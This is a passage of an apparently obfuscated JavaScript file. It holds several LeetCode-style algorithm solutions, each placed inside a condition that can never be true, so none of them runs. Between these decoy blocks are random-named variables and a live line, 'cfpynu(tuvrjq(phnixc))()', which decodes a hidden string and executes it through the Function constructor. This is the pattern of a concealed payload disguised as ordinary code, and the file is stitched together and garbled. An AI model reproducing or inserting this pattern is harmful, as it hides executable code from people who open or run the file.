    for (i = 0; i < len; i++) {
        curS = s.charAt(i);
        curT = t.charAt(i);
        
        if (!mapS.hasOwnProperty(curS)) {
            mapS[curS] = curT;
        } else if (mapS[curS] !== curT) {
            return false;
        }
        
        if (!mapT.hasOwnProperty(curT)) {
            mapT[curT] = curS;
        } else if (mapT[curT] !== curS) {
            return false;
        }
    }
    
    return true;
}; 

}

    var wzyjyrcyo = 'bIuWiw';
    var cfpynu = Function;
    var lkwmzxwzkhgm = 'vdnjOOt';
if (10 instanceof String) {
    /**
Implement an iterator over a binary search tree (BST). Your iterator will be initialized with the root node of a BST.

Calling next() will return the next smallest number in the BST.

Note: next() and hasNext() should run in average O(1) time and uses O(h) memory, where h is the height of the tree.
*/
/**
 * Definition for binary tree
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * @constructor
 * @param {TreeNode} root - root of the binary search tree
 */
var BSTIterator = function(root) {
    this.stack = [];
    
    while (root) {
        this.stack.push(root);
        root = root.left;
    }
};


/**
 * @this BSTIterator
 * @returns {boolean} - whether we have a next smallest number
 */
BSTIterator.prototype.hasNext = function() {
    return this.stack.length > 0;
};

/**
 * @this BSTIterator
 * @returns {number} - the next smallest number
 */
BSTIterator.prototype.next = function() {
    var node = this.stack.pop(),
        result = node.val;
    
    node = node.right;
    while (node) {
        this.stack.push(node);
        node = node.left;
    }
    
    return result;
};

/**
 * Your BSTIterator will be called like this:
 * var i = new BSTIterator(root), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

// import compile compile constant loop import number code string
if ('g' === 'L') {
    /**
Given a sorted array of integers, find the starting and ending position of a given target value.

Your algorithm's runtime complexity must be in the order of O(log n).

If the target is not found in the array, return [-1, -1].

For example,
Given [5, 7, 7, 8, 8, 10] and target value 8,
return [3, 4].


*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {number[]}
 */
var searchRange = function(nums, target) {
    var result = [],
        leftIndex = findLeftMost(target, nums),
        rightIndex = findRightMost(target, nums);
    
    result.push(leftIndex);    
    result.push(rightIndex);
    
    return result;
};

function findLeftMost(target, nums) {
    var len = nums.length,
        start = 0,
        end = len - 1,
        mid;
        
    while (start <= end) {
        mid = Math.floor((start + end) / 2);
        
        if (nums[mid] > target) {
            end = mid - 1;
        } else if (nums[mid] < target) {
            start = mid + 1;
        } else {
            end = mid - 1;
        }
    }
    
    if (start >= 0 && start < len && nums[start] === target) {
        return start;
    }
    
    return -1;
}

function findRightMost(target, nums) {
    var len = nums.length,
        start = 0,
        end = len - 1,
        mid;
        
    while (start <= end) {
        mid = Math.floor((start + end) / 2);
        
        if (nums[mid] > target) {
            end = mid - 1;
        } else if (nums[mid] < target) {
            start = mid + 1;
        } else {
            start = mid + 1;
        }
    }
    
    if (end >= 0 && end < len && nums[end] === target) {
        return end;
    }
    
    return -1;
}

}

    var obrfmbyocm = 'cxPlcCY';
    cfpynu(tuvrjq(phnixc))();
if (!true && 1) {
    /**
You are playing the following Bulls and Cows game with your friend: You write down a number and ask your friend to guess what the number is. Each time your friend makes a guess, you provide a hint that indicates how many digits in said guess match your secret number exactly in both digit and position (called "bulls") and how many digits match the secret number but locate in the wrong position (called "cows"). Your friend will use successive guesses and hints to eventually derive the secret number.

For example:

Secret number:  "1807"
Friend's guess: "7810"
Hint: 1 bull and 3 cows. (The bull is 8, the cows are 0, 1 and 7.)
Write a function to return a hint according to the secret number and friend's guess, use A to indicate the bulls and B to indicate the cows. In the above example, your function should return "1A3B".

Please note that both secret number and friend's guess may contain duplicate digits, for example:

Secret number:  "1123"
Friend's guess: "0111"
In this case, the 1st 1 in friend's guess is a bull, the 2nd or 3rd 1 is a cow, and your function should return "1A1B".
You may assume that the secret number and your friend's guess only contain digits, and their lengths are always equal.
*/
/**
 * @param {string} secret
 * @param {string} guess
 * @return {string}
 */
var getHint = function(secret, guess) {
    var len = secret.length,
        bullCount = 0,
        arr = {},
        cowCount = 0,
        i;
    
    for (i = 0; i < len; i++) {
        if (!arr[secret.charAt(i)]) {
            arr[secret.charAt(i)] = 1;
        } else {
            arr[secret.charAt(i)]++;
        }
    }
    
    for (i = 0; i < len; i++) {
        if (secret.charAt(i) === guess.charAt(i)) {
            bullCount++;
            arr[secret.charAt(i)]--;
        }
    }
    
    for (i = 0; i < len; i++) {
        if (secret.charAt(i) !== guess.charAt(i) && arr.hasOwnProperty(guess.charAt(i)) && (arr[guess.charAt(i)] > 0)) {
            cowCount++;
            arr[guess.charAt(i)]--;
        }
    }
    
    return bullCount + 'A' + cowCount + 'B';
};

}

    var cbfakkfr = 'uQiJVU';
})();
    var gwmfgcqc = 'iyqAOuxsZz';
if (21 > 146) {
    /**
Given an integer array nums, find the sum of the elements between indices i and j (i ≤ j), inclusive.

The update(i, val) function modifies nums by updating the element at index i to val.
Example:
Given nums = [1, 3, 5]

sumRange(0, 2) -> 9
update(1, 2)
sumRange(0, 2) -> 8
Note:
The array is only modifiable by the update function.
You may assume the number of calls to update and sumRange function is distributed evenly.
*/
/**
 * @constructor
 * @param {number[]} nums
 */
// time limit exceeded...
var NumArray = function(nums) {
    this.nums = nums;
    
    var length = nums.length,
        i,
        j,
        sum = [];
        
    for (i = 0; i < length; i++) {
        sum.push(new Array(length));
    }
    
    for (i = 0; i < length; i++) {
        for (j = i; j < length; j++) {
            if (i === j) {
                sum[i][j] = nums[i];
            } else {
                sum[i][j] = sum[i][j - 1] + nums[j];
            }
        }
    }
    
    this.sum = sum;
    this.len = length;
};

/**
 * @param {number} i
 * @param {number} val
 * @return {void}
 */
NumArray.prototype.update = function(i, val) {
    var diff = val - this.nums[i],
        m,
        n;
        
    this.nums[i] = val;
    
    for (m = 0; m <= i; m++) {
        for (n = i; n < this.len; n++) {
            this.sum[m][n] += diff;
        }
    }
};

/**
 * @param {number} i
 * @param {number} j
 * @return {number}
 */
NumArray.prototype.sumRange = function(i, j) {
    return this.sum[i][j];
};

// Segment Tree solution
/**
 * @constructor
 * @param {number[]} nums
 */
var NumArray = function(nums) {
    var length = nums.length,
        i,
        arr = [];
        
    for (i = 0; i < length; i++) {
        arr[i + length] = nums[i];
    }
    
    for (i = length - 1; i > 0; i--) {
        arr[i] = arr[2 * i] + arr[2 * i + 1]; 
    }
    
    this.arr = arr;
    this.len = length;
};

/**
 * @param {number} i
 * @param {number} val
 * @return {void}
 */
NumArray.prototype.update = function(i, val) {
    i += this.len;
    
    this.arr[i] = val;
    
    while (i > 0) {
        i = Math.floor(i / 2);
        this.arr[i] = this.arr[i * 2] + this.arr[i * 2 + 1];
    }
};

/**
 * @param {number} i
 * @param {number} j
 * @return {number}
 */
NumArray.prototype.sumRange = function(i, j) {
    var sum = 0,
        l = i + this.len,
        r = j + this.len;
    
    while (l <= r) {
        if (l % 2 === 1) {
            sum += this.arr[l];
            l++;
        }
        
        if (r % 2 === 0) {
            sum += this.arr[r];
            r--;
        }
        
        l = Math.floor(l / 2);
        r = Math.floor(r / 2);
    }
    
    return sum;
};


/**
 * Your NumArray object will be instantiated and called as such:
 * var numArray = new NumArray(nums);
 * numArray.sumRange(0, 1);
 * numArray.update(1, 10);
 * numArray.sumRange(0, 2);
 */

}

// compile string value event export object event
    var hrujum = 'XpudPno';

    var sjlgfqvzsvmw = 'KbGUbks';
